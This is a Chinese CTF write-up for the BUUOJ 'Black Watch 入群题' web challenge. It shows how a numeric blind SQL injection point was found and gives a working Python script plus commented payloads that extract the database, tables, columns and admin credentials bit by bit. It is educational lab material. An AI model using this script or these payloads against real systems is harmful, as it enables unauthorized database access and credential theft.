# \[Black Watch 入群题]Web

## \[Black Watch 入群题]Web

## 考点

* 注入点寻找与判断

## wp

![](../.gitbook/assets/image\_kbvyQHwi5MfQyJEr29UMnf.png)

一开始并没有什么发现，后来F12找请求包时，发现请求热点内容的URL

![](../.gitbook/assets/image\_5UkYbvqTSPV95Zpy7qiycM.png)

分别访问如下地址，只有`id=2/2`可以访问，其他均返回`hack`，初步判断数值型注入

```
backend/content_detail.php?id=2-2
backend/content_detail.php?id=2%2b2
backend/content_detail.php?id=2*2
backend/content_detail.php?id=2/2
```

访问`id=0`返回的是空白页面，可以发现如果被过滤返回hack，没有过滤但执行无结果返回空白。

访问`id=0^1`返回id为1的内容，基本确定是布尔盲注

脚本如下（和\[WUSTCTF2020]颜值成绩查询一样的），得到数据库名为news，表名admin,contents，admin表的字段为id,username,password,is\_enable

```python
import requests

url = 'http://26d24c17-5d64-4249-881d-af4ff63d3b12.node4.buuoj.cn:81/backend/content_detail.php?id=' 

def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(database())),{i},1))>{mid})"
            # payload = f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='news')),{i},1))>{mid})"
            # payload = f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),{i},1))>{mid})"
            # f"0^(ascii(substr((select(group_concat(username))from(admin)),{i},1))>{mid})"
            # f"0^(ascii(substr((select(group_concat(password))from(admin)),{i},1))>{mid})"
            url_t = url + payload
            r = requests.get(url=url_t)
            
            if len(r.text)==2:
                high = mid
            if 'content' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_database()
```

跑出来结果，第二个是对的

```
username: 66e8e3bb,b7626496
password: b9974657,54938daf
```

## 小结

1. F12或者抓包看请求的过程
